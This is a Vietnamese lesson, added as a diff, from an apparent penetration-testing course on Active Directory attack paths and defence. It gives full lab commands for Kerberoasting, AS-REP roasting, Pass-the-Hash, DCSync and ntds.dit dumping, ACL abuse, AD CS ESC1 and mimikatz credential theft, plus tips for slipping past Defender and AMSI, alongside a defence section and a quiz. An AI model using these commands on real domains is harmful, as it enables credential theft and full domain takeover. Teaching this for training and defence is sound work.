@@ -1,0 +1,387 @@
+---
+title: "Active Directory: điểm yếu thường gặp và phòng thủ"
+code: "3.5"
+level: 3
+summary: "AD hiếm khi bị hạ bằng một lỗ hổng phần mềm. Nó bị hạ bằng việc nối nhiều quan hệ quyền hạn hợp lệ thành một chuỗi, qua các kỹ thuật kinh điển: Kerberoasting, AS-REP roasting, Pass-the-Hash và DCSync."
+duration: "90 phút"
+updated: "2026-11-12"
+prereq: ["3.4", "2.6"]
+objectives:
+  - "Giải thích được khái niệm đường đi tấn công (attack path) trong AD, khác một lỗ hổng đơn lẻ ở đâu"
+  - "Thực hiện được Kerberoasting và AS-REP roasting để lấy hash, rồi Pass-the-Hash để đăng nhập thẳng bằng hash"
+  - "Giải thích được vì sao DCSync là nước đi cuối, rút được hash của cả domain"
+  - "Đề xuất được biện pháp phòng thủ tương ứng: thu hẹp và cắt đường đi, không chỉ vá từng lỗi riêng lẻ"
+---
+import Callout from '../../components/ui/Callout.astro';
+import Terminal from '../../components/ui/Terminal.astro';
+import Lenh from '../../components/ui/Lenh.astro';
+import LabBrief from '../../components/ui/LabBrief.astro';
+import ConceptMap from '../../components/sim/ConceptMap.tsx';
+import Quiz from '../../components/sim/Quiz.tsx';
+
+## Hình dung trước
+
+Trong một công ty, một nhân viên thường không có chìa khoá phòng giám đốc. Nhưng nếu họ quản lý tài khoản của trợ lý, mà trợ lý lại có quyền vào phòng giám đốc, thì tồn tại một "đường đi" gián tiếp, dù không ai trong chuỗi đó làm gì sai cả.
+
+Tấn công AD phần lớn là tìm những chuỗi quan hệ như vậy, và bài này áp dụng trực tiếp những gì bạn vừa dựng nền ở bài 3.4: domain, Kerberos, và BloodHound.
+
+## Kiến thức chính
+
+### Đường đi tấn công
+
+Giữa các đối tượng AD có vô số quan hệ quyền hạn. Kẻ tấn công không cần một lỗ hổng to; họ nối nhiều quan hệ nhỏ thành chuỗi từ tài khoản thường tới Domain Admin. Chuỗi đó gọi là *attack path* (đường đi tấn công), và BloodHound (bài 3.4) vẽ ra nó thành sơ đồ.
+
+### Các kỹ thuật kinh điển (cơ chế)
+
+- **Kerberoasting:** bất kỳ người dùng domain nào cũng xin được vé dịch vụ (TGS) cho một tài khoản có SPN. Vé đó được mã hoá bằng mật khẩu của tài khoản dịch vụ, nên đem về **bẻ khoá ngoại tuyến** (bài 2.6). Tài khoản dịch vụ hay có mật khẩu yếu, ít đổi.
+- **AS-REP roasting:** bình thường, muốn xin vé Kerberos thì phải chứng minh mình là ai trước (bước pre-authentication). Nếu một tài khoản bị tắt bước này, ai cũng xin được một mẩu dữ liệu mã hoá bằng mật khẩu của nó mà **không cần đăng nhập**, rồi mang về bẻ khoá.
+- **Pass-the-Hash (PtH):** trên Windows, để đăng nhập đôi khi chỉ cần **hash NTLM** (chuỗi băm của mật khẩu, bài 2.6), không cần biết mật khẩu gốc. Vì vậy lấy được hash là đăng nhập được luôn, khỏi mất công bẻ khoá.
+- **DCSync:** một tài khoản có quyền sao chép của DC có thể "giả làm DC" yêu cầu đồng bộ và rút **hash mật khẩu của mọi người dùng**, kể cả Administrator. Thường là nước đi cuối. (Khi đã có quyền admin *trên chính DC*, một cách tương đương là chép thẳng cơ sở dữ liệu AD — file `ntds.dit` — qua một bản Volume Shadow Copy rồi trích hash offline bằng `impacket-secretsdump`; hữu ích khi DCSync bị chặn hoặc muốn ồn ít hơn.)
+
+### Một đường đi ví dụ
+
+<ConceptMap
+  client:visible
+  title="Chuỗi quan hệ dẫn từ nhân viên tới quản trị domain"
+  width={760}
+  height={300}
+  nodes={[
+    { id: 'emp', label: 'Tài khoản nhân viên', x: 105, y: 150, w: 170, detail: 'Điểm khởi đầu: một tài khoản domain thường đã chiếm (ví dụ qua Kerberoasting một svc yếu).' },
+    { id: 'grp', label: 'Nhóm IT Helpdesk', x: 350, y: 50, w: 165, tone: 'warn', detail: 'Tài khoản tình cờ thuộc nhóm này, có quyền đặt lại mật khẩu cho một số tài khoản khác.' },
+    { id: 'svc', label: 'Tài khoản quyền cao', x: 350, y: 250, tone: 'warn', detail: 'Tài khoản mà nhóm IT đặt lại mật khẩu được, lại có quyền trên DC.' },
+    { id: 'da', label: 'Domain Admin / DCSync', x: 640, y: 150, w: 190, tone: 'accent', detail: 'Đích đến. Với quyền phù hợp, DCSync rút hash của mọi người dùng, hoàn tất chiếm domain.' },
+  ]}
+  edges={[
+    { from: 'emp', to: 'grp', label: 'thành viên' },
+    { from: 'grp', to: 'svc', label: 'đặt lại mật khẩu' },
+    { from: 'svc', to: 'da', label: 'dẫn tới' },
+  ]}
+/>
+
+## Thực hành: công cụ cho từng kỹ thuật
+
+Bộ **impacket** (Python) và **Rubeus**/**mimikatz** (Windows) là công cụ chủ lực. Hai ví dụ dưới đây đi theo đúng chuỗi quen thuộc: lấy một mẩu dữ liệu mã hoá bằng mật khẩu ai đó (Kerberoasting, AS-REP roasting), rồi dùng kết quả đó để đăng nhập (bẻ khoá, hoặc Pass-the-Hash thẳng luôn không cần bẻ).
+
+<Lenh noi="Terminal trên máy Kali" muc="Xin vé dịch vụ cho mọi tài khoản có SPN, rồi bẻ khoá ngoại tuyến để lấy mật khẩu tài khoản dịch vụ" quyen="Cần một tài khoản domain thường hợp lệ (ở đây jdoe)">
+
+<Terminal title="Kerberoasting bằng impacket">
+
+```text
+kali@lab:~$ impacket-GetUserSPNs -request -dc-ip 10.10.14.50 megacorp.lab/jdoe:'Summer2024!'
+ServicePrincipalName  Name     ...
+MSSQL/sql01           svc_sql
+$krb5tgs$23$*svc_sql*...$hoRtE9k...   # đem hash này đi bẻ:
+
+kali@lab:~$ hashcat -m 13100 kerb.hash /usr/share/wordlists/rockyou.txt
+$krb5tgs$23$...:P@ssw0rd2019          # mật khẩu svc_sql
+```
+
+</Terminal>
+
+<div slot="giai">
+
+- `impacket-GetUserSPNs -request -dc-ip 10.10.14.50 megacorp.lab/jdoe:'Summer2024!'`: liệt kê mọi tài khoản có SPN trong domain, và `-request` bảo nó **đi xin luôn vé TGS** cho từng tài khoản đó (không chỉ liệt kê).
+- `-dc-ip 10.10.14.50`: địa chỉ Domain Controller để gửi yêu cầu tới.
+- `hashcat -m 13100 ...`: `-m 13100` là mã chế độ cho hash kiểu Kerberos TGS-REP (RC4), đúng loại hash `$krb5tgs$23$...` lấy được ở trên.
+
+</div>
+
+<div slot="doc">
+
+- Bảng đầu liệt kê từng tài khoản có SPN: cột `ServicePrincipalName` (tên dịch vụ) và `Name` (tên tài khoản, ví dụ `svc_sql`).
+- Dòng dài bắt đầu bằng `$krb5tgs$23$*svc_sql*...` là **chính vé TGS**, được mã hoá bằng mật khẩu tài khoản đó — lưu dòng này vào một file (ví dụ `kerb.hash`) để đem bẻ khoá.
+- Kết quả hashcat có dạng `hash:mật-khẩu`. Phần sau dấu `:` cuối (`P@ssw0rd2019`) là **mật khẩu thật của svc_sql**.
+- Không bẻ được: mật khẩu không nằm trong wordlist, hoặc tài khoản dùng gMSA (mật khẩu 240 byte ngẫu nhiên, không bẻ được).
+
+</div>
+
+</Lenh>
+
+<Lenh noi="Terminal trên máy Kali" muc="Tìm tài khoản đã tắt Kerberos pre-authentication để lấy hash không cần đăng nhập, rồi minh hoạ đăng nhập chỉ bằng hash NTLM (Pass-the-Hash)">
+
+<Terminal title="AS-REP roasting và Pass-the-Hash bằng impacket">
+
+```text
+kali@lab:~$ impacket-GetNPUsers megacorp.lab/ -usersfile users.txt -dc-ip 10.10.14.50
+$krb5asrep$23$svc_old@MEGACORP.LAB:...   # tài khoản tắt pre-authentication
+
+kali@lab:~$ impacket-psexec -hashes :aad3b...31d6c megacorp.lab/administrator@10.10.14.60
+# Pass-the-Hash: đăng nhập chỉ bằng hash NTLM, không cần mật khẩu gốc
+C:\> whoami
+nt authority\system
+```
+
+</Terminal>
+
+<div slot="giai">
+
+- `impacket-GetNPUsers megacorp.lab/ -usersfile users.txt -dc-ip 10.10.14.50`: thử xin vé AS-REP cho **từng tên** trong `users.txt`, không cần biết mật khẩu nào cả — chỉ cần tên tài khoản có thật và đã tắt pre-authentication.
+- `impacket-psexec -hashes :aad3b...31d6c megacorp.lab/administrator@10.10.14.60`: đăng nhập và mở shell từ xa như PsExec, nhưng dùng `-hashes` thay cho mật khẩu. Dạng `:hash` (trước dấu `:` để trống) nghĩa là chỉ có hash NTLM, không có hash LM.
+
+</div>
+
+<div slot="doc">
+
+- Dòng `$krb5asrep$23$svc_old@MEGACORP.LAB:...` chỉ xuất hiện cho **tài khoản đã tắt pre-authentication** (ở đây là `svc_old`) — các tài khoản khác trong `users.txt` không in gì. Đem dòng này đi bẻ khoá bằng hashcat (`-m 18200`), giống cách làm với Kerberoasting.
+- Dòng `# Pass-the-Hash: ...` là chú thích giải thích ý nghĩa của lệnh phía trên nó, không phải output thật.
+- `whoami` chạy **trên máy mục tiêu** (`10.10.14.60`) qua shell vừa mở, trả về `nt authority\system`: đăng nhập thành công với quyền SYSTEM, chỉ bằng hash, không cần biết mật khẩu gốc của administrator.
+- Lỗi `STATUS_LOGON_FAILURE`: hash sai, hoặc tài khoản đó không có quyền đăng nhập từ xa trên máy đích.
+
+</div>
+
+</Lenh>
+
+### Rút hash của cả domain: DCSync và ntds.dit
+
+Khi tài khoản trong tay có quyền sao chép của domain (Domain Admin, hoặc được cấp riêng hai quyền `DS-Replication-Get-Changes` và `...-All`), DCSync là một lệnh từ Kali.
+
+Khi DCSync bị chặn nhưng bạn có shell quản trị trên chính DC, hoặc thuộc nhóm **Backup Operators**, đường thứ hai là chép thẳng file cơ sở dữ liệu `ntds.dit`. File này đang bị hệ thống khoá, nên phải chép qua một bản chụp ổ đĩa (Volume Shadow Copy).
+
+<Lenh noi="Lệnh đầu trên Kali; phần còn lại trong shell quản trị trên Domain Controller, rồi quay về Kali" muc="Lấy hash NTLM của mọi tài khoản domain, bằng DCSync từ xa hoặc bằng cách chép ntds.dit qua shadow copy" quyen="DCSync cần quyền sao chép domain; vssadmin cần quyền quản trị trên DC">
+
+<Terminal title="DCSync, và ntds.dit qua vssadmin">
+
+```text
+kali@lab:~$ impacket-secretsdump megacorp.lab/svc_adm:'NewPass123!'@10.10.14.50 -just-dc-ntlm
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1693c6cefafffc7af11ef34d1c788f47:::
+
+    --- cách thứ hai, trên DC ---
+C:\> vssadmin create shadow /for=C:
+Shadow Copy Volume Name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
+
+C:\> copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit C:\Windows\Temp\ntds.dit
+C:\> reg save HKLM\SYSTEM C:\Windows\Temp\system.save
+
+kali@lab:~$ impacket-secretsdump -ntds ntds.dit -system system.save LOCAL
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::
+```
+
+</Terminal>
+
+<div slot="giai">
+
+- `impacket-secretsdump ... -just-dc-ntlm`: giả làm một DC, xin đồng bộ và chỉ lấy hash NTLM của các tài khoản domain (bỏ phần Kerberos key cho gọn).
+- `vssadmin create shadow /for=C:`: tạo một bản chụp của ổ `C:`. Trong bản chụp, file không bị khoá nên chép được.
+- `copy \\?\GLOBALROOT\...\Windows\NTDS\ntds.dit`: chép cơ sở dữ liệu AD từ bản chụp ra. `reg save HKLM\SYSTEM` lấy khoá giải mã, giống cách làm với SAM ở bài 3.2.
+- `impacket-secretsdump -ntds ... -system ... LOCAL`: giải mã ngoại tuyến trên Kali.
+
+</div>
+
+<div slot="doc">
+
+- Có hash của `Administrator` là xong phần AD: đăng nhập DC bằng Pass-the-Hash (`impacket-psexec -hashes :8846f7ea... megacorp.lab/administrator@10.10.14.50`) rồi đọc `proof.txt`.
+- Hash của `krbtgt` là nguyên liệu của golden ticket (bài 3.9). Trong báo cáo, việc lấy được nó nghĩa là khách hàng phải đổi mật khẩu `krbtgt` hai lần.
+- Chỉ là Backup Operators, không có shell quản trị: dùng `diskshadow` thay `vssadmin`, rồi chép bằng `robocopy /b` (chế độ sao lưu, bỏ qua kiểm tra quyền).
+- Xoá bản chụp sau khi xong: `vssadmin delete shadows /shadow={ID} /quiet`.
+
+</div>
+
+</Lenh>
+
+### Bộ công cụ chạy trên chính máy Windows
+
+Có lúc bạn không chạy được impacket từ Kali, ví dụ khi máy đích nằm sau một lớp mạng chưa dựng tunnel, hoặc bạn chỉ có một phiên RDP. Mỗi việc ở trên đều có lệnh tương đương chạy ngay trên máy Windows đã chiếm:
+
+| Việc cần làm | Công cụ | Lệnh |
+|---|---|---|
+| Liệt kê người dùng, nhóm, máy | PowerView | `Import-Module .\PowerView.ps1` rồi `Get-NetUser \| select samaccountname,description`, `Get-NetGroup "Domain Admins" -Recurse`, `Get-NetComputer \| select dnshostname` |
+| Tìm máy mà tài khoản hiện tại là quản trị viên | PowerView | `Find-LocalAdminAccess` |
+| Tìm quyền ACL bị cấp dư trên một đối tượng | PowerView | `Get-ObjectAcl -Identity svc_adm -ResolveGUIDs \| ? {$_.ActiveDirectoryRights -match "GenericAll\|WriteDacl"}` |
+| Gom dữ liệu cho BloodHound | SharpHound | `.\SharpHound.exe -c All` rồi chép file `.zip` về Kali |
+| Kerberoasting | Rubeus | `.\Rubeus.exe kerberoast /outfile:kerb.hash` |
+| AS-REP roasting | Rubeus | `.\Rubeus.exe asreproast /outfile:asrep.hash` |
+| Đọc hash và vé của người đang đăng nhập (cần quản trị viên cục bộ) | mimikatz | `privilege::debug` rồi `sekurlsa::logonpasswords` |
+| Đọc hash tài khoản cục bộ | mimikatz | `token::elevate` rồi `lsadump::sam` |
+| DCSync | mimikatz | `lsadump::dcsync /user:megacorp\krbtgt` |
+| Mở một cửa sổ mới dưới danh nghĩa người khác bằng hash | mimikatz | `sekurlsa::pth /user:administrator /domain:megacorp.lab /ntlm:8846f7ea... /run:powershell` |
+
+PowerShell chặn script mặc định: mở bằng `powershell -ep bypass` trước khi `Import-Module`. Với mimikatz qua một reverse shell không tương tác, viết mọi lệnh trên một dòng: `mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"`.
+
+<Callout type="note" label="Vì sao sekurlsa::logonpasswords quan trọng trong cụm AD của đề thi">
+Windows giữ hash (đôi khi cả mật khẩu) của mọi người <em>đang có phiên đăng nhập</em> trên máy trong bộ nhớ tiến trình LSASS. Vì vậy mỗi khi chiếm được quyền quản trị cục bộ trên một máy thành viên, việc đầu tiên là đọc LSASS: rất hay có một tài khoản quyền cao hơn từng đăng nhập vào đó, và hash của họ là bước sang máy kế tiếp. Đây là mắt xích nối máy 1, máy 2 và DC trong hầu hết cụm AD luyện thi. Từ Kali, lệnh tương đương là <code>nxc smb 10.10.14.60 -u administrator -H &lt;hash&gt; --lsa --sam</code> hoặc <code>impacket-secretsdump</code> nhắm vào máy đó.
+</Callout>
+
+<Callout type="note">
+Mẫu số chung: nhiều kỹ thuật kết thúc bằng một hash đem đi <strong>bẻ khoá ngoại tuyến</strong> (bài 2.6) hoặc dùng thẳng (Pass-the-Hash). Hãy thấy sợi dây nối các bài: liệt kê (3.4) → lấy vé/hash (3.5) → bẻ khoá (2.6) → đăng nhập → lặp lại ở quyền cao hơn.
+</Callout>
+
+Hai công cụ nữa hay gặp trong phần AD của đề thi, nêu ở mức nhận biết:
+
+- **NetExec** (trước là CrackMapExec): thử nhanh một bộ thông tin trên nhiều máy hoặc nhiều tài khoản cùng lúc — tiện cho **password spraying** (một mật khẩu, nhiều tài khoản, bài 2.6) và kiểm tra một cặp tài khoản dùng được ở đâu. Rất ồn với hệ thống giám sát.
+- **PowerView / SharpHound chạy từ một máy Windows đã chiếm:** nhiều khi bạn đã đứng trên một máy trong domain, nên liệt kê *từ bên trong* bằng chính công cụ Windows. SharpHound gom dữ liệu rồi nạp vào BloodHound (bài 3.4) để vẽ đường đi.
+
+Đây đều là các thao tác liệt kê và thử thông tin đăng nhập; chúng mạnh, nhưng cũng để lại dấu rõ cho phía phòng thủ, nên luôn chỉ chạy trong lab hoặc nơi được phép bằng văn bản.
+
+### Hai đường đi qua quyền hạn bị cấp dư
+
+Bốn kỹ thuật trên lấy *thông tin đăng nhập*. Nhưng BloodHound thường chỉ ra một dạng đường đi khác: một **quyền trên đối tượng** mà ai đó được cấp dư. Hai cái hay gặp nhất trong đề thi:
+
+- **Lạm dụng ACL (GenericAll, WriteDACL, ForceChangePassword):** nếu tài khoản bạn đang có được cấp một trong các quyền này *trên một tài khoản khác*, bạn không cần biết mật khẩu của họ — bạn **đặt lại mật khẩu của họ**. BloodHound tô đúng cạnh này và ghi rõ quyền. Ví dụ với `GenericAll` trên tài khoản `svc_adm`:
+
+<Lenh noi="Terminal trên máy Kali, đang có tài khoản jdoe mà BloodHound báo có GenericAll trên svc_adm" muc="Dùng quyền được cấp dư để đặt lại thẳng mật khẩu của một tài khoản quyền cao hơn, khỏi cần biết mật khẩu cũ" quyen="Cần đúng quyền BloodHound đã xác nhận (ở đây GenericAll/ForceChangePassword trên svc_adm)">
+
+<Terminal title="Đặt lại mật khẩu qua ACL bằng NetExec">
+
+```text
+kali@lab:~$ nxc ldap 10.10.14.50 -u jdoe -p 'Summer2024!' \
+            -M set-password -o TARGET=svc_adm NEWPASS='NewPass123!'
+LDAP  10.10.14.50  [+] Password set for svc_adm
+```
+
+</Terminal>
+
+<div slot="giai">
+
+- `nxc ldap ... -M set-password`: gọi module `set-password` của NetExec, dùng quyền của `jdoe` để tác động lên LDAP.
+- `-o TARGET=svc_adm NEWPASS='NewPass123!'`: đặt lại mật khẩu của `svc_adm` thành chuỗi bạn chọn. Giờ đăng nhập `svc_adm` bằng mật khẩu mới và đi tiếp theo đường BloodHound vẽ.
+
+</div>
+
+<div slot="doc">
+
+- Kỹ thuật này **thay đổi mật khẩu thật** của một tài khoản — rất ồn và gây gián đoạn cho người dùng đó. Trong dự án thật phải báo và đặt lại đúng giá trị cũ; trong lab thì tuỳ ý.
+- Nếu chỉ có `WriteDACL` (quyền sửa danh sách quyền) chứ chưa có quyền đổi mật khẩu, bước đầu là **tự cấp cho mình** quyền đó rồi mới đổi — BloodHound ghi rõ chuỗi.
+
+</div>
+
+</Lenh>
+
+<Lenh noi="Terminal trên máy Kali, khi BloodHound báo jdoe có WriteDACL trên một nhóm quản trị hoặc trên chính domain" muc="Tự cấp quyền FullControl/DCSync bằng impacket-dacledit khi chỉ có WriteDACL" quyen="Cần quyền WriteDACL trên đối tượng đích">
+
+<Terminal title="Nâng quyền từ WriteDACL bằng impacket-dacledit">
+
+```text
+kali@lab:~$ impacket-dacledit -action 'write' -rights 'FullControl' \
+            -principal 'jdoe' -target 'svc_adm' megacorp.lab/jdoe:'Summer2024!'
+[*] DACL backed up to dacledit-20261112.bak
+[*] DACL modified successfully!
+
+kali@lab:~$ nxc ldap 10.10.14.50 -u jdoe -p 'Summer2024!' \
+            -M set-password -o TARGET=svc_adm NEWPASS='NewPass123!'
+```
+
+</Terminal>
+
+<div slot="giai">
+
+- `impacket-dacledit -action 'write' -rights 'FullControl' -principal 'jdoe' -target 'svc_adm'`: ghi thêm quyền `FullControl` cho `jdoe` lên `svc_adm`. Nếu đối tượng đích là gốc domain (`-target-dn 'DC=megacorp,DC=lab'`) và `-rights 'DCSync'`, bạn đi thẳng tới DCSync mà không cần đổi mật khẩu ai.
+
+</div>
+
+<div slot="doc">
+
+- Công cụ tự sao lưu DACL cũ ra file `.bak` để bạn hoàn tác sau khi kiểm thử xong (`-action restore -file ...`).
+
+</div>
+
+</Lenh>
+
+- **AD CS (ESC1 — mẫu chứng chỉ cấp quyền mạo danh):** nhiều doanh nghiệp dựng **Active Directory Certificate Services (AD CS)** để cấp chứng chỉ nội bộ. Nếu một mẫu chứng chỉ (template) cho phép người dùng thường đăng ký và **tự điền tên người khác** vào trường Subject Alternative Name (`ENROLLEE_SUPPLIES_SUBJECT`), bạn xin một chứng chỉ mang tên `administrator` rồi dùng nó đăng nhập thẳng DC mà không cần mật khẩu:
+
+<Lenh noi="Terminal trên máy Kali, nhắm vào máy chủ CA trong domain" muc="Tìm mẫu chứng chỉ lỗi ESC1, xin chứng chỉ giả danh administrator và lấy hash NT của administrator" quyen="Một tài khoản domain thường bất kỳ">
+
+<Terminal title="Khai thác AD CS ESC1 bằng certipy-ad">
+
+```text
+kali@lab:~$ certipy-ad find -u jdoe@megacorp.lab -p 'Summer2024!' -dc-ip 10.10.14.50 -vulnerable -stdout
+Template Name : UserAuth
+[!] Vulnerabilities : ESC1
+
+kali@lab:~$ certipy-ad req -u jdoe@megacorp.lab -p 'Summer2024!' -dc-ip 10.10.14.50 \
+            -ca megacorp-CA -template UserAuth -upn administrator@megacorp.lab
+
+kali@lab:~$ certipy-ad auth -pfx administrator.pfx -dc-ip 10.10.14.50
+[*] Got hash for 'administrator@megacorp.lab': aad3b435b51404eeaad3b435b51404ee:8846f7ea...
+```
+
+</Terminal>
+
+<div slot="giai">
+
+- `certipy-ad find -vulnerable -stdout`: quét AD CS tìm các mẫu chứng chỉ cấu hình sai (`ESC1`, `ESC4`, `ESC8`...).
+- `certipy-ad req ... -upn administrator@megacorp.lab`: xin chứng chỉ dưới tên `administrator`.
+- `certipy-ad auth -pfx administrator.pfx`: dùng chứng chỉ vừa xin để xác thực Kerberos (PKINIT) và rút ra vé TGT cùng hash NTLM của `administrator` để Pass-the-Hash.
+
+</div>
+
+<div slot="doc">
+
+- Nếu `certipy-ad auth` báo lỗi `KDC_ERR_PADATA_TYPE_NOSUPP`, DC chưa hỗ trợ PKINIT hoặc bạn đang trỏ nhầm IP; thử dùng vé `.ccache` (nếu có) hoặc kiểm tra đồng bộ giờ giữa Kali và DC (`ntpdate` / `timedatectl`).
+
+</div>
+
+</Lenh>
+
+<Callout type="note" label="Khi PowerView, Rubeus hoặc mimikatz bị Defender/AMSI chặn">
+Trên máy Windows có bật Defender, thả file <code>Rubeus.exe</code> hay nạp <code>PowerView.ps1</code> thường bị chặn ngay lập tức. Thay vì tốn thời gian làm rối mã nguồn, trong phần lớn tình huống bạn chuyển sang <strong>chạy từ Kali qua tunnel</strong> (bài 3.3, 3.9): dùng <code>bloodhound-python</code> thay SharpHound, <code>nxc</code>/<code>impacket</code> thay PowerView và Rubeus, và <code>nxc smb ... --lsa --sam</code> hoặc <code>impacket-secretsdump</code> thay cho mimikatz trên đĩa.
+</Callout>
+
+- **Mật khẩu GPP trong SYSVOL (cpassword):** xưa, quản trị viên đặt mật khẩu local admin hàng loạt qua Group Policy Preferences. Mật khẩu đó nằm trong file XML ở share `SYSVOL` (mọi tài khoản domain đọc được), mã hoá bằng một khoá AES mà **Microsoft đã công bố công khai** — nghĩa là giải ra được. Tìm chuỗi `cpassword=` trong SYSVOL rồi giải bằng `gpp-decrypt`. Hiếm dần trên domain mới, nhưng vẫn gặp trong lab và hệ thống cũ.
+
+<LabBrief
+  ten="Tự tạo một tài khoản dịch vụ yếu, rồi Kerberoast chính nó"
+  muctieu="Trên domain tự dựng ở bài 3.4, tạo một tài khoản có SPN với mật khẩu yếu, rồi tự đi hết chuỗi: xin vé, bẻ khoá, xác nhận đăng nhập được"
+  may="Lab AD tự dựng ở bài 3.4 (một Domain Controller, một tài khoản domain thường để tấn công)"
+  thoigian="40 phút"
+  xong="Bạn bẻ ra đúng mật khẩu chữ rõ của tài khoản dịch vụ, và đăng nhập được bằng tài khoản đó vào domain"
+>
+
+1. Bằng tài khoản quản trị domain, tạo một tài khoản mới (ví dụ `svc_test`) với một mật khẩu nằm trong `rockyou.txt` (ví dụ một mật khẩu phổ biến có trong danh sách).
+2. Gắn một Service Principal Name (SPN) giả cho tài khoản đó bằng `setspn -A service/svc_test svc_test` chạy trên Domain Controller.
+3. Từ Kali, dùng một tài khoản domain thường khác để Kerberoast, đúng như phần Thực hành của bài.
+4. Bẻ khoá vé thu được bằng hashcat với `rockyou.txt`.
+5. Xác nhận mật khẩu đúng bằng cách đăng nhập (RDP, WinRM, hoặc `smbclient`) với tài khoản `svc_test`.
+
+<div slot="goiy1">
+Lệnh Kerberoasting đã có đủ trong khối "Lấy vé dịch vụ rồi bẻ khoá" của phần Thực hành — chỉ cần đổi domain và tài khoản tấn công cho khớp lab bạn vừa dựng ở bài 3.4.
+</div>
+
+<div slot="goiy2">
+Mã chế độ hashcat cho hash Kerberos TGS-REP là `-m 13100`, đã nhắc trong phần "Ngoại tuyến" của bài 2.6.
+</div>
+
+<div slot="kiemtra">
+
+- Đúng: hashcat in ra đúng mật khẩu bạn đã đặt cho `svc_test` ở bước 1.
+- `impacket-GetUserSPNs` không thấy tài khoản nào: kiểm tra `setspn -L svc_test` trên DC để xác nhận SPN đã gắn thành công.
+- Bẻ khoá không ra kết quả: xác nhận mật khẩu đặt ở bước 1 thật sự nằm trong `rockyou.txt` — thử `grep ^matkhau rockyou.txt` trước khi đổ lỗi cho lệnh hashcat.
+
+</div>
+
+</LabBrief>
+
+## Góc phòng thủ
+
+<Callout type="defense">
+Nếu bạn là người quản trị AD, đừng cố "vá" từng kỹ thuật riêng lẻ, vì chúng không phải lỗi phần mềm để vá.
+
+Phòng thủ AD hiện đại tập trung thu hẹp và cắt các đường đi tấn công: chuyển tài khoản dịch vụ sang dùng mật khẩu dài tự động xoay vòng (<strong>gMSA</strong>) để Kerberoasting lấy được vé cũng không bẻ nổi; bật <strong>Kerberos pre-authentication</strong> cho mọi tài khoản để chặn AS-REP roasting; tách riêng tài khoản quản trị theo tầng (chỉ đăng nhập trên máy quản trị được bảo vệ) để hash của admin không rơi vào máy trạm cho Pass-the-Hash nhặt; giới hạn tối thiểu quyền sao chép của DC nhằm chặn DCSync; rà và thu hồi các quyền cấp dư trên đối tượng (GenericAll, WriteDACL) mà BloodHound làm lộ ra; gỡ mọi mật khẩu GPP cũ còn sót trong SYSVOL (Microsoft đã có bản vá chặn tạo mới từ 2014); và định kỳ tự chạy BloodHound để tìm cắt các chuỗi quyền thừa trước kẻ tấn công.
+
+Về <strong>phát hiện</strong>: xin vé dịch vụ hàng loạt (Kerberoasting) để lại sự kiện <code>4769</code> với kiểu mã hoá RC4 (<code>0x17</code>, bài 8.1); AS-REP roasting tạo sự kiện <code>4768</code> không pre-auth; Pass-the-Hash sinh ra <code>4624</code> (Logon Type 3 hoặc Type 9 với NTLM); password spraying tạo chuỗi <code>4625</code>/<code>4771</code>; yêu cầu sao chép thư mục từ một máy không phải DC (DCSync) hiện ra ở sự kiện <code>4662</code>; còn xin chứng chỉ bất thường ở AD CS ghi tại <code>4886</code>/<code>4887</code>. Bật audit và đẩy về SOC sẽ làm lộ diện toàn bộ chuỗi tấn công trên.
+</Callout>
+
+## Lỗi người mới hay gặp
+
+- **Tìm một "lỗ hổng" duy nhất.** Người mới quen tư duy từ Cấp 2 (một CVE, một payload) và mang nguyên tư duy đó vào AD, trong khi AD thường bị hạ bằng chuỗi quan hệ hợp lệ, không phải một lỗi đơn lẻ.
+- **Bỏ qua tài khoản dịch vụ (SPN).** Đã nhắc ở bài 3.4, nhưng đáng nhắc lại: đây là nơi mở ra Kerberoasting, và bỏ qua nó là bỏ lỡ một trong những đường đi dễ nhất.
+- **Không chạy BloodHound.** Cố nối các quan hệ bằng tay rất dễ bỏ sót, trong khi BloodHound cho bạn thấy ngay bức tranh đường đi tổng thể trong vài giây.
+
+## Kiểm tra nhanh
+
+<Quiz
+  client:visible
+  questions={[
+    { q: 'Kerberoasting lợi dụng điều gì?', options: ['Lỗi phần mềm DC', 'Bất kỳ người dùng domain nào cũng xin được vé dịch vụ, mã hoá bằng mật khẩu tài khoản dịch vụ, rồi đem bẻ khoá', 'Mật khẩu để lộ trong file'], answer: 1, explain: 'Vé TGS cho tài khoản có SPN được mã hoá bằng mật khẩu của tài khoản đó, nên đem bẻ khoá ngoại tuyến.' },
+    { q: 'Pass-the-Hash nghĩa là gì?', options: ['Đoán mật khẩu từ hash', 'Xác thực chỉ bằng hash NTLM, không cần mật khẩu gốc', 'Gửi hash cho DC để đổi mật khẩu'], answer: 1, explain: 'Trên Windows, đôi khi hash NTLM là đủ để xác thực, khỏi cần bẻ về mật khẩu gốc.' },
+    { q: 'DCSync cho kẻ tấn công thứ gì?', options: ['Một web shell', 'Hash mật khẩu của mọi người dùng, bằng cách giả làm DC yêu cầu đồng bộ', 'Quyền đọc một file'], answer: 1, explain: 'Với quyền sao chép của DC, kẻ tấn công rút được hash toàn domain, kể cả Administrator.' },
+    { q: 'Hướng phòng thủ AD hiện đại nhấn mạnh điều gì?', options: ['Chỉ vá phần mềm', 'Thu hẹp và cắt các đường đi tấn công', 'Đổi tên domain'], answer: 1, explain: 'Vì vấn đề là quan hệ quyền hạn, phòng thủ tập trung giảm và cắt đường đi.' },
+    { q: 'Trong BloodHound, bạn thấy tài khoản jdoe có quyền WriteDACL trên đối tượng Domain (DC=megacorp,DC=lab), nhưng không phải Domain Admin. Bước đi ngắn nhất là gì?', options: ['Chạy Kerberoasting lại từ đầu', 'Dùng impacket-dacledit tự cấp quyền DCSync cho jdoe trên đối tượng Domain rồi chạy secretsdump', 'Đợi Domain Admin đăng nhập vào máy trạm'], answer: 1, explain: 'WriteDACL cho phép sửa danh sách quyền của đối tượng đích; tự cấp quyền DCSync trên gốc domain là đi thẳng tới rút hash toàn domain.' },
+  ]}
+/>
+
+## Ghi nhớ
+
+- Tấn công AD là nối nhiều quan hệ hợp lệ thành một đường đi tới Domain Admin, không phải khai thác một lỗ hổng đơn lẻ.
